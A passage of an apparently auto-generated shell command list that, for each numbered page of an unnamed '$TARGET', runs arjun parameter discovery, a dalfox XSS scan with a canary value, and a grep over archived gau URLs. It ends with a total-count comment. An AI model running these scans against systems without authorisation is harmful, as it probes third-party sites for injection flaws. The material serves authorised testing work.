+arjun -u "$TARGET/page916" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_916.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_916.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_916.txt"
+arjun -u "$TARGET/page919" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_919.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_919.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_919.txt"
+arjun -u "$TARGET/page922" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_922.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_922.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_922.txt"
+arjun -u "$TARGET/page925" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_925.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_925.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_925.txt"
+arjun -u "$TARGET/page928" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_928.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_928.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_928.txt"
+arjun -u "$TARGET/page931" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_931.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_931.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_931.txt"
+arjun -u "$TARGET/page934" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_934.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_934.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_934.txt"
+arjun -u "$TARGET/page937" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_937.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_937.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_937.txt"
+arjun -u "$TARGET/page940" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_940.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_940.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_940.txt"
+arjun -u "$TARGET/page943" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_943.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_943.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_943.txt"
+arjun -u "$TARGET/page946" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_946.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_946.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_946.txt"
+arjun -u "$TARGET/page949" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_949.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_949.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_949.txt"
+arjun -u "$TARGET/page952" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_952.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_952.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_952.txt"
+arjun -u "$TARGET/page955" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_955.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_955.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_955.txt"
+arjun -u "$TARGET/page958" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_958.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_958.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_958.txt"
+arjun -u "$TARGET/page961" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_961.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_961.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_961.txt"
+arjun -u "$TARGET/page964" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_964.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_964.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_964.txt"
+arjun -u "$TARGET/page967" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_967.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_967.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_967.txt"
+arjun -u "$TARGET/page970" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_970.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_970.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_970.txt"
+arjun -u "$TARGET/page973" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_973.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_973.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_973.txt"
+arjun -u "$TARGET/page976" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_976.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_976.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_976.txt"
+arjun -u "$TARGET/page979" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_979.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_979.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_979.txt"
+arjun -u "$TARGET/page982" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_982.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_982.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_982.txt"
+arjun -u "$TARGET/page985" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_985.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_985.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_985.txt"
+arjun -u "$TARGET/page988" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_988.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_988.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_988.txt"
+arjun -u "$TARGET/page991" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_991.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_991.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_991.txt"
+arjun -u "$TARGET/page994" --include "order_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_order_id_994.json"
+dalfox url "$TARGET/search?order_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_order_id_994.txt"
+grep -Ei "order_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_order_id_994.txt"
+arjun -u "$TARGET/page997" --include "q=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_q_997.json"
+dalfox url "$TARGET/search?q=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_q_997.txt"
+grep -Ei "q=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_q_997.txt"
+arjun -u "$TARGET/page1000" --include "sort=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_sort_1000.json"
+dalfox url "$TARGET/search?sort=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_sort_1000.txt"
+grep -Ei "sort=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_sort_1000.txt"
+arjun -u "$TARGET/page1003" --include "file=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_file_1003.json"
+dalfox url "$TARGET/search?file=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_file_1003.txt"
+grep -Ei "file=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_file_1003.txt"
+arjun -u "$TARGET/page1006" --include "redirect=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_redirect_1006.json"
+dalfox url "$TARGET/search?redirect=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_redirect_1006.txt"
+grep -Ei "redirect=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_redirect_1006.txt"
+arjun -u "$TARGET/page1009" --include "pid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_pid_1009.json"
+dalfox url "$TARGET/search?pid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_pid_1009.txt"
+grep -Ei "pid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_pid_1009.txt"
+arjun -u "$TARGET/page1012" --include "product_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_product_id_1012.json"
+dalfox url "$TARGET/search?product_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_product_id_1012.txt"
+grep -Ei "product_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_product_id_1012.txt"
+arjun -u "$TARGET/page1015" --include "cat=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_cat_1015.json"
+dalfox url "$TARGET/search?cat=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_cat_1015.txt"
+grep -Ei "cat=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_cat_1015.txt"
+arjun -u "$TARGET/page1018" --include "search=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_search_1018.json"
+dalfox url "$TARGET/search?search=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_search_1018.txt"
+grep -Ei "search=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_search_1018.txt"
+arjun -u "$TARGET/page1021" --include "ref=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_ref_1021.json"
+dalfox url "$TARGET/search?ref=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_ref_1021.txt"
+grep -Ei "ref=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_ref_1021.txt"
+arjun -u "$TARGET/page1024" --include "url=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_url_1024.json"
+dalfox url "$TARGET/search?url=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_url_1024.txt"
+grep -Ei "url=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_url_1024.txt"
+arjun -u "$TARGET/page1027" --include "uid=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_uid_1027.json"
+dalfox url "$TARGET/search?uid=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_uid_1027.txt"
+grep -Ei "uid=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_uid_1027.txt"
+arjun -u "$TARGET/page1030" --include "user_id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_id_1030.json"
+dalfox url "$TARGET/search?user_id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_id_1030.txt"
+grep -Ei "user_id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_id_1030.txt"
+arjun -u "$TARGET/page1033" --include "page=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_page_1033.json"
+dalfox url "$TARGET/search?page=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_page_1033.txt"
+grep -Ei "page=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_page_1033.txt"
+arjun -u "$TARGET/page1036" --include "query=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_query_1036.json"
+dalfox url "$TARGET/search?query=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_query_1036.txt"
+grep -Ei "query=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_query_1036.txt"
+arjun -u "$TARGET/page1039" --include "filter=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_filter_1039.json"
+dalfox url "$TARGET/search?filter=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_filter_1039.txt"
+grep -Ei "filter=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_filter_1039.txt"
+arjun -u "$TARGET/page1042" --include "path=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_path_1042.json"
+dalfox url "$TARGET/search?path=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_path_1042.txt"
+grep -Ei "path=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_path_1042.txt"
+arjun -u "$TARGET/page1045" --include "id=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_id_1045.json"
+dalfox url "$TARGET/search?id=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_id_1045.txt"
+grep -Ei "id=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_id_1045.txt"
+arjun -u "$TARGET/page1048" --include "user=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_user_1048.json"
+dalfox url "$TARGET/search?user=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_user_1048.txt"
+grep -Ei "user=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_user_1048.txt"
+# total_commands: 1051
